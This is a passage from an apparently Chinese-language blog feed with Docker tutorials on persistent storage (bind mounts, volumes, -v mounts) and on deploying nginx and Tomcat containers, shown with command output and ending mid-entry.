        <content type="html"><![CDATA[<h1 id="Docker容器数据持久化存储机制"><a href="#Docker容器数据持久化存储机制" class="headerlink" title="Docker容器数据持久化存储机制"></a>Docker容器数据持久化存储机制</h1><h1 id="一、Docker容器数据持久化存储介绍"><a href="#一、Docker容器数据持久化存储介绍" class="headerlink" title="一、Docker容器数据持久化存储介绍"></a>一、Docker容器数据持久化存储介绍</h1><ul><li><p>物理机或虚拟机数据持久化存储</p><ul><li>由于物理机或虚拟机本身就拥有大容量的磁盘，所以可以直接把数据存储在物理机或虚拟机本地文件系统中，亦或者也可以通过使用额外的存储系统（NFS、GlusterFS、Ceph等）来完成数据持久化存储。</li></ul></li><li><p>Docker容器数据持久化存储</p><ul><li>由于Docker容器是由容器镜像生成的，所以一般容器镜像中包含什么文件或目录，在容器启动后，我们依旧可以看到相同的文件或目录。</li><li>由于Docker容器属于“用后即焚”型计算资源，因此Docker容器不适合做数据持久化存储</li></ul></li></ul><h1 id="二、Docker容器数据持久化存储方式"><a href="#二、Docker容器数据持久化存储方式" class="headerlink" title="二、Docker容器数据持久化存储方式"></a>二、Docker容器数据持久化存储方式</h1><p>Docker提供三种方式将数据从宿主机挂载到容器中：</p><ul><li>docker run -v<ul><li>运行容器时，直接挂载本地目录至容器中</li></ul></li><li>volumes<ul><li>Docker管理宿主机文件系统的一部分(/var/lib/docker/volumes)</li><li>是Docker默认存储数据方式</li></ul></li><li>bind mounts<ul><li>将宿主机上的任意位置文件或目录挂载到容器中</li></ul></li></ul><h1 id="三、Docker容器数据持久化存储方式应用案例演示"><a href="#三、Docker容器数据持久化存储方式应用案例演示" class="headerlink" title="三、Docker容器数据持久化存储方式应用案例演示"></a>三、Docker容器数据持久化存储方式应用案例演示</h1><h2 id="3-1-docker-run-v"><a href="#3-1-docker-run-v" class="headerlink" title="3.1 docker run -v"></a>3.1 docker run -v</h2><h3 id="3-1-1-未挂载本地目录"><a href="#3-1-1-未挂载本地目录" class="headerlink" title="3.1.1 未挂载本地目录"></a>3.1.1 未挂载本地目录</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行一个容器，未挂载本地目录<span class="token comment"># docker run -d --name web1 nginx:latest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMESc4ad9f2c15fa   nginx:latest   <span class="token string">"/docker-entrypoint.…"</span>   46 seconds ago   Up 44 seconds   80/tcp    web1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">使用curl命令访问容器<span class="token comment"># curl http://172.17.0.2</span>&lt;<span class="token operator">!</span>DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;<span class="token operator">/</span>title&gt;&lt;style&gt;html <span class="token punctuation">{</span> color-scheme: light dark<span class="token punctuation">;</span> <span class="token punctuation">}</span>body <span class="token punctuation">{</span> width: 35em<span class="token punctuation">;</span> margin: 0 auto<span class="token punctuation">;</span>font-family: Tahoma<span class="token punctuation">,</span> Verdana<span class="token punctuation">,</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span> <span class="token punctuation">}</span>&lt;<span class="token operator">/</span>style&gt;&lt;<span class="token operator">/</span>head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;<span class="token operator">/</span>h1&gt;&lt;p&gt;<span class="token keyword">If</span> you see this page<span class="token punctuation">,</span> the nginx web server is successfully installed andworking<span class="token punctuation">.</span> Further configuration is required<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>p&gt;&lt;p&gt;<span class="token keyword">For</span> online documentation and support please refer to&lt;a href=<span class="token string">"http://nginx.org/"</span>&gt;nginx<span class="token punctuation">.</span>org&lt;<span class="token operator">/</span>a&gt;<span class="token punctuation">.</span>&lt;br/&gt;Commercial support is available at&lt;a href=<span class="token string">"http://nginx.com/"</span>&gt;nginx<span class="token punctuation">.</span>com&lt;<span class="token operator">/</span>a&gt;<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>p&gt;&lt;p&gt;&lt;em&gt;Thank you <span class="token keyword">for</span> <span class="token keyword">using</span> nginx<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>em&gt;&lt;<span class="token operator">/</span>p&gt;&lt;<span class="token operator">/</span>body&gt;&lt;<span class="token operator">/</span>html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看容器中<span class="token operator">/</span>usr/share/nginx/html目录中目录或子目录<span class="token comment"># docker exec web ls /usr/share/nginx/html</span>50x<span class="token punctuation">.</span>htmlindex<span class="token punctuation">.</span>html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-2-挂载本地目录"><a href="#3-1-2-挂载本地目录" class="headerlink" title="3.1.2 挂载本地目录"></a>3.1.2 挂载本地目录</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建本地目录<span class="token comment"># mkdir /opt/wwwroot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">向本地目录中添加index<span class="token punctuation">.</span>html文件<span class="token comment"># echo 'kubemsb' &gt; /opt/wwwroot/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行web2容器，把<span class="token operator">/</span>opt/wwwroot目录挂载到<span class="token operator">/</span>usr/share/nginx/html目录中<span class="token comment"># docker run -d --name web2 -v /opt/wwwroot/:/usr/share/nginx/html/ nginx:latest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看容器IP地址<span class="token comment"># docker inspect web2</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token string">"IPAddress"</span>: <span class="token string">"172.17.0.3"</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">使用curl命令访问容器<span class="token comment"># curl http://172.17.0.3</span>kubemsb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-1-3-未创建本地目录"><a href="#3-1-3-未创建本地目录" class="headerlink" title="3.1.3 未创建本地目录"></a>3.1.3 未创建本地目录</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行web3容器，挂载未创建的本地目录，启动容器时将自动创建本地目录<span class="token comment"># docker run -d --name web3 -v /opt/web3root/:/usr/share/nginx/html/ nginx:latest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">往自动创建的目录中添加一个index<span class="token punctuation">.</span>html文件<span class="token comment"># echo "kubemsb web3" &gt; /opt/web3root/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在容器中执行查看文件命令<span class="token comment"># docker exec web3 cat /usr/share/nginx/html/index.html</span>kubemsb web3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-2-volumes"><a href="#3-2-volumes" class="headerlink" title="3.2 volumes"></a>3.2 volumes</h2><h3 id="3-2-1-创建数据卷"><a href="#3-2-1-创建数据卷" class="headerlink" title="3.2.1 创建数据卷"></a>3.2.1 创建数据卷</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建一个名称为nginx-vol的数据卷<span class="token comment"># docker volume create nginx-vol</span>nginx-vol<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">确认数据卷创建后的位置<span class="token comment"># ls /var/lib/docker/volumes/</span>backingFsBlockDev  metadata<span class="token punctuation">.</span>db  nginx-vol<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看已经创建数据卷<span class="token comment"># docker volume ls</span>DRIVER    VOLUME NAMElocal     nginx-vol<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看数据卷详细信息<span class="token comment"># docker volume inspect nginx-vol</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span>        <span class="token string">"CreatedAt"</span>: <span class="token string">"2022-02-08T14:36:16+08:00"</span><span class="token punctuation">,</span>        <span class="token string">"Driver"</span>: <span class="token string">"local"</span><span class="token punctuation">,</span>        <span class="token string">"Labels"</span>: <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token string">"Mountpoint"</span>: <span class="token string">"/var/lib/docker/volumes/nginx-vol/_data"</span><span class="token punctuation">,</span>        <span class="token string">"Name"</span>: <span class="token string">"nginx-vol"</span><span class="token punctuation">,</span>        <span class="token string">"Options"</span>: <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token string">"Scope"</span>: <span class="token string">"local"</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-使用数据卷"><a href="#3-2-2-使用数据卷" class="headerlink" title="3.2.2 使用数据卷"></a>3.2.2 使用数据卷</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行web4容器，使用<span class="token operator">--</span><span class="token function">mount</span>选项，实现数据卷挂载<span class="token comment"># docker run -d --name web4 --mount src=nginx-vol,dst=/usr/share/nginx/html nginx:latest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行web4容器，使用<span class="token operator">-</span>v选项，实现数据卷挂载<span class="token comment"># docker run -d --name web4 -v nginx-vol:/usr/share/nginx/html/ nginx:latest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看容器运行后数据卷中文件或子目录<span class="token comment"># ls /var/lib/docker/volumes/nginx-vol/_data/</span>50x<span class="token punctuation">.</span>html  index<span class="token punctuation">.</span>html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">使用curl命令访问容器<span class="token comment"># curl http://172.17.0.2</span>&lt;<span class="token operator">!</span>DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;<span class="token operator">/</span>title&gt;&lt;style&gt;html <span class="token punctuation">{</span> color-scheme: light dark<span class="token punctuation">;</span> <span class="token punctuation">}</span>body <span class="token punctuation">{</span> width: 35em<span class="token punctuation">;</span> margin: 0 auto<span class="token punctuation">;</span>font-family: Tahoma<span class="token punctuation">,</span> Verdana<span class="token punctuation">,</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span> <span class="token punctuation">}</span>&lt;<span class="token operator">/</span>style&gt;&lt;<span class="token operator">/</span>head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;<span class="token operator">/</span>h1&gt;&lt;p&gt;<span class="token keyword">If</span> you see this page<span class="token punctuation">,</span> the nginx web server is successfully installed andworking<span class="token punctuation">.</span> Further configuration is required<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>p&gt;&lt;p&gt;<span class="token keyword">For</span> online documentation and support please refer to&lt;a href=<span class="token string">"http://nginx.org/"</span>&gt;nginx<span class="token punctuation">.</span>org&lt;<span class="token operator">/</span>a&gt;<span class="token punctuation">.</span>&lt;br/&gt;Commercial support is available at&lt;a href=<span class="token string">"http://nginx.com/"</span>&gt;nginx<span class="token punctuation">.</span>com&lt;<span class="token operator">/</span>a&gt;<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>p&gt;&lt;p&gt;&lt;em&gt;Thank you <span class="token keyword">for</span> <span class="token keyword">using</span> nginx<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>em&gt;&lt;<span class="token operator">/</span>p&gt;&lt;<span class="token operator">/</span>body&gt;&lt;<span class="token operator">/</span>html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">修改index<span class="token punctuation">.</span>html文件内容<span class="token comment"># echo "web4" &gt; /var/lib/docker/volumes/nginx-vol/_data/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">再次使用curl命令访问容器<span class="token comment"># curl http://172.17.0.2</span>web4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-3-bind-mounts"><a href="#3-3-bind-mounts" class="headerlink" title="3.3 bind mounts"></a>3.3 bind mounts</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建用于容器挂载的目录web5root<span class="token comment"># mkdir /opt/web5root</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行web5容器并使用bind <span class="token function">mount</span>方法实现本地任意目录挂载<span class="token comment"># docker run -d --name web5 --mount type=bind,src=/opt/web5root,dst=/usr/share/nginx/html nginx:latest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看已挂载目录，里面没有任何数据<span class="token comment"># ls /opt/web5root/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">添加内容至<span class="token operator">/</span>opt/web5root/index<span class="token punctuation">.</span>html中<span class="token comment"># echo "web5" &gt; /opt/web5root/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">使用curl命令访问容器<span class="token comment"># curl http://172.17.0.3</span>web5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/05-docker-rong-qi-hua-bu-shu-qi-ye-ji-ying-yong-ji-qun/docker-rong-qi-hua-bu-shu-qi-ye-ji-ying-yong-ji-qun/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/05-docker-rong-qi-hua-bu-shu-qi-ye-ji-ying-yong-ji-qun/docker-rong-qi-hua-bu-shu-qi-ye-ji-ying-yong-ji-qun/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker容器化部署企业级应用集群"><a href="#Docker容器化部署企业级应用集群" class="headerlink" title="Docker容器化部署企业级应用集群"></a>Docker容器化部署企业级应用集群</h1><h1 id="一、Docker容器化部署企业级应用"><a href="#一、Docker容器化部署企业级应用" class="headerlink" title="一、Docker容器化部署企业级应用"></a>一、Docker容器化部署企业级应用</h1><h2 id="1-1-使用Docker容器化部署企业级应用必要性"><a href="#1-1-使用Docker容器化部署企业级应用必要性" class="headerlink" title="1.1 使用Docker容器化部署企业级应用必要性"></a>1.1 使用Docker容器化部署企业级应用必要性</h2><ul><li>有利于快速实现企业级应用部署</li><li>有利于快速实现企业级应用恢复</li></ul><h2 id="1-2-使用Docker容器化部署企业级应用参考资料"><a href="#1-2-使用Docker容器化部署企业级应用参考资料" class="headerlink" title="1.2 使用Docker容器化部署企业级应用参考资料"></a>1.2 使用Docker容器化部署企业级应用参考资料</h2><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211145757283.png" alt="image-20220211145757283"></p><h1 id="二、使用Docker容器实现Nginx部署"><a href="#二、使用Docker容器实现Nginx部署" class="headerlink" title="二、使用Docker容器实现Nginx部署"></a>二、使用Docker容器实现Nginx部署</h1><h2 id="2-1-获取参考资料"><a href="#2-1-获取参考资料" class="headerlink" title="2.1 获取参考资料"></a>2.1 获取参考资料</h2><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211145839441.png" alt="image-20220211145839441"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211145905117.png" alt="image-20220211145905117"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211145956450.png" alt="image-20220211145956450"></p><h2 id="2-2-运行Nginx应用容器"><a href="#2-2-运行Nginx应用容器" class="headerlink" title="2.2 运行Nginx应用容器"></a>2.2 运行Nginx应用容器</h2><blockquote><p>不在docker host暴露端口</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -d --name nginx-server -v /opt/nginx-server:/usr/share/nginx/html:ro nginx</span>664cd1bbda4ad2a71cbd09f0c6baa9b34db80db2d69496670a960be07b9521cb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE       COMMAND                  CREATED          STATUS          PORTS                                                  NAMES664cd1bbda4a   nginx       <span class="token string">"/docker-entrypoint.…"</span>   4 seconds ago    Up 3 seconds    80/tcp                                                 nginx-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker inspect 664 | grep IPAddress</span>            <span class="token string">"SecondaryIPAddresses"</span>: null<span class="token punctuation">,</span>            <span class="token string">"IPAddress"</span>: <span class="token string">"172.17.0.3"</span><span class="token punctuation">,</span>                    <span class="token string">"IPAddress"</span>: <span class="token string">"172.17.0.3"</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># curl http://172.17.0.3</span>&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;<span class="token operator">/</span>title&gt;&lt;<span class="token operator">/</span>head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;<span class="token operator">/</span>h1&gt;&lt;<span class="token operator">/</span>center&gt;&lt;hr&gt;&lt;center&gt;nginx/1<span class="token punctuation">.</span>21<span class="token punctuation">.</span>6&lt;<span class="token operator">/</span>center&gt;&lt;<span class="token operator">/</span>body&gt;&lt;<span class="token operator">/</span>html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls /opt</span>nginx-server<span class="token comment"># echo "nginx is working" &gt; /opt/nginx-server/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># curl http://172.17.0.3</span>nginx is working<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-3-运行Nginx应用容器"><a href="#2-3-运行Nginx应用容器" class="headerlink" title="2.3 运行Nginx应用容器"></a>2.3 运行Nginx应用容器</h2><blockquote><p>在docker host暴露80端口</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -d -p 80:80 --name nginx-server-port -v /opt/nginx-server-port:/usr/share/nginx/html:ro nginx</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE       COMMAND                  CREATED             STATUS             PORTS                                                  NAMES74dddf51983d   nginx       <span class="token string">"/docker-entrypoint.…"</span>   3 seconds ago       Up 2 seconds       0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:80-&gt;80/tcp<span class="token punctuation">,</span> :::80-&gt;80/tcp                      nginx-server-port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls /opt</span>nginx-server  nginx-server-port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># echo "nginx is running" &gt; /opt/nginx-server-port/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>在宿主机上访问</strong></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211151131609.png" alt="image-20220211151131609"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker top nginx-server-port</span>UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMDroot                22195               22163               0                   15:08               ?                   00:00:00            nginx: master <span class="token keyword">process</span> nginx <span class="token operator">-</span>g daemon off<span class="token punctuation">;</span>101                 22387               22195               0                   15:08               ?                   00:00:00            nginx: worker <span class="token keyword">process</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-4-运行Nginx应用容器"><a href="#2-4-运行Nginx应用容器" class="headerlink" title="2.4 运行Nginx应用容器"></a>2.4 运行Nginx应用容器</h2><blockquote><p>挂载配置文件,需要创建一个nginx容器，把配置文件复制出来修改后使用。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker cp nginxwebcontainername:/etc/nginx/nginx.conf /opt/nginxcon/</span>修改后即可使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls /opt/nginxcon/nginx.conf</span><span class="token operator">/</span>opt/nginxcon/nginx<span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -d \</span><span class="token operator">-</span>p 82:80 <span class="token operator">--</span>name nginx-server-conf \<span class="token operator">-</span>v <span class="token operator">/</span>opt/nginx-server-conf:<span class="token operator">/</span>usr/share/nginx/html:ro \<span class="token operator">-</span>v <span class="token operator">/</span>opt/nginxcon/nginx<span class="token punctuation">.</span>conf:<span class="token operator">/</span>etc/nginx/nginx<span class="token punctuation">.</span>conf:ro \nginx76251ec44e5049445399303944fc96eb8161ccb49e27b673b99cb2492009523c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker top nginx-server-conf</span>UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMDroot                25005               24972               0                   15:38               ?                   00:00:00            nginx: master <span class="token keyword">process</span> nginx <span class="token operator">-</span>g daemon off<span class="token punctuation">;</span>101                 25178               25005               0                   15:38               ?                   00:00:00            nginx: worker <span class="token keyword">process</span>101                 25179               25005               0                   15:38               ?                   00:00:00            nginx: worker <span class="token keyword">process</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三、使用Docker容器实现Tomcat部署"><a href="#三、使用Docker容器实现Tomcat部署" class="headerlink" title="三、使用Docker容器实现Tomcat部署"></a>三、使用Docker容器实现Tomcat部署</h1><h2 id="3-1-获取参考资料"><a href="#3-1-获取参考资料" class="headerlink" title="3.1 获取参考资料"></a>3.1 获取参考资料</h2><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211154602595.png" alt="image-20220211154602595"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211154639682.png" alt="image-20220211154639682"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211154747062.png" alt="image-20220211154747062"></p><h2 id="3-2-运行tomcat应用容器"><a href="#3-2-运行tomcat应用容器" class="headerlink" title="3.2 运行tomcat应用容器"></a>3.2 运行tomcat应用容器</h2><h3 id="3-2-1-不暴露端口运行"><a href="#3-2-1-不暴露端口运行" class="headerlink" title="3.2.1 不暴露端口运行"></a>3.2.1 不暴露端口运行</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -d --rm tomcat:9.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE        COMMAND                  CREATED             STATUS             PORTS                                                  NAMESc20a0e781246   tomcat:9<span class="token punctuation">.</span>0   <span class="token string">"catalina.sh run"</span>        27 seconds ago      Up 25 seconds      8080/tcp                                               heuristic_cori<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-暴露端口运行"><a href="#3-2-2-暴露端口运行" class="headerlink" title="3.2.2 暴露端口运行"></a>3.2.2 暴露端口运行</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -d -p 8080:8080 --rm tomcat:9.0</span>2fcf5762314373c824928490b871138a01a94abedd7e6814ad5f361d09fbe1de<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE        COMMAND                  CREATED             STATUS             PORTS                                                  NAMES2fcf57623143   tomcat:9<span class="token punctuation">.</span>0   <span class="token string">"catalina.sh run"</span>        3 seconds ago       Up 1 second        0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:8080-&gt;8080/tcp<span class="token punctuation">,</span> :::8080-&gt;8080/tcp              eloquent_chatelet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>在宿主机访问</strong></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220211160925125.png" alt="image-20220211160925125"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker exec 2fc ls /usr/local/tomcat/webapps</span>里面为空，所以可以添加网站文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3-暴露端口及添加网站文件"><a href="#3-2-3-暴露端口及添加网站文件" class="headerlink" title="3.2.3 暴露端口及添加网站文件"></a>3.2.3 暴露端口及添加网站文件</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -d -p 8081:8080 -v /opt/tomcat-server:/usr/local/tomcat/webapps/ROOT tomcat:9.0</span>f456e705d48fc603b7243a435f0edd6284558c194e105d87befff2dccddc0b63<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token 